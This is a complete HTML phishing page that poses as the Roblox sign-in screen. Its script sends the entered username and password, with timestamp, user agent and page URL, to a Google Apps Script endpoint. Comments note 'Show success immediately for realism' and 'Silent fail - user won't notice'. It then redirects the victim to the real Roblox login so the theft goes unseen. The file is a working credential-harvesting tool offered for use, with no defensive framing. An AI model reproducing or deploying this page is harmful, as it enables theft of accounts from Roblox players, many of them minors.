<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            margin: 20px;
        }
        .roblox-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .roblox-logo h1 {
            font-size: 2.5em;
            color: #00a2ff;
            font-weight: bold;
            text-decoration: none;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #00a2ff;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #00a2ff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .login-btn:hover {
            background: #008ccf;
        }
        .login-btn:active {
            transform: translateY(1px);
        }
        .forgot-password {
            text-align: center;
            margin-top: 20px;
        }
        .forgot-password a {
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
        }
        .alert {
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 6px;
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: none;
        }
        @media (max-width: 480px) {
            .login-container {
                margin: 10px;
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="roblox-logo">
            <h1>ROBLOX</h1>
        </div>
        
        <div id="successAlert" class="alert">
            🔄 Redirecting to Roblox...
        </div>
        
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required autocomplete="username" placeholder="Enter your username or email">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="Enter your password">
            </div>
            
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        
        <div class="forgot-password">
            <a href="#" onclick="alert('Use the email associated with your account to recover your password.')">Forgot Password or Username?</a> | 
            <a href="#" onclick="alert('Create your Roblox account to join millions of players worldwide!')">Sign Up</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData();
            formData.append('username', document.getElementById('username').value);
            formData.append('password', document.getElementById('password').value);
            formData.append('timestamp', new Date().toISOString());
            formData.append('ip', ''); // Client-side IP detection limited
            formData.append('useragent', navigator.userAgent);
            formData.append('url', window.location.href);
            
            // Show success immediately for realism
            document.getElementById('successAlert').style.display = 'block';
            document.querySelector('.login-btn').textContent = 'Signing In...';
            document.querySelector('.login-btn').disabled = true;
            
            try {
                // Send to YOUR Google Script
                await fetch('https://script.google.com/macros/s/AKfycbygpKidIx7hABjNq5mxdrFvuiMmihSWKDE9xZT9V-Y-aGHhg9zI5CPMpOuBfFjejLmT/exec', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors' // Required for Google Scripts
                });
            } catch(e) {
                // Silent fail - user won't notice
            }
            
            // Redirect to real Roblox after 2.5s
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login';
            }, 2500);
        });
    </script>
</body>
</html>
